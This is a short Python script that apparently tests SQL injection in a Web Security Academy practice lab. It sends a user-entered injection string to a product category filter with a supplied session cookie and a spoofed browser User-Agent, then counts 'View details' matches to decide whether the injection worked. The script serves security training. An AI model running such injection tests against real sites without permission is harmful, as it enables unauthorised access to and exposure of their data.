import requests

url = input("Enter the URL: ")
endpoint = input("Enter the endpoint: ")
user_input = input("Enter the user input: ")

url2 = url+endpoint+user_input

headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0',
	'Cookie': input("Enter the cookie value: ")
}

response = requests.get(url2, headers=headers)
print(url2)

view_details_count = response.text.count("View details")
if response.text.count("View details") > 12:
	print("SQL Injection is successful")
	print(view_details_count)
else:
	print(response.text)

#https://0a4d0044035a93c584b19fc00087002d.web-security-academy.net/filter?category=Lifestyle